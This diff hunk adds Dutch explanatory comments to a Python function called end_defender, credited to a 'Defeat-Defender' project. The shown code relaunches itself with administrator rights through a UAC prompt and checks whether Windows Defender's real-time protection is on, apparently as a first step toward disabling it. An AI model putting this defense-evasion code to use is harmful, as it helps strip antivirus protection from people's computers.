@@ -97,11 +97,15 @@ ASADMIN = "asadmin"
 def end_defender():
     # Source: https://github.com/witchfindertr/Defeat-Defender-Python-Version-/blob/c2a43b4b2f570b87259ca368a98d2e3ab3572dff/Defeat-Defender.py#L11-L15
     if sys.argv[-1] != ASADMIN:
+        # haalt de path of van deze script
         script = os.path.abspath(sys.argv[0])
+        # start deze functie opnieuw maar dit keer met admin rechten
         params = ' '.join([script] + sys.argv[1:] + [ASADMIN])
         ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, params, None, 1)
+        # sluit de powershell die geen admin rechten heeft
         sys.exit(0)
 
+    # dit is de powershell command die uitgevoerd moet worden
     completed = subprocess.run(
         ["powershell", "-Command", "Get-MpComputerStatus | Select-Object RealTimeProtectionEnabled"], 
         capture_output=True, text=True
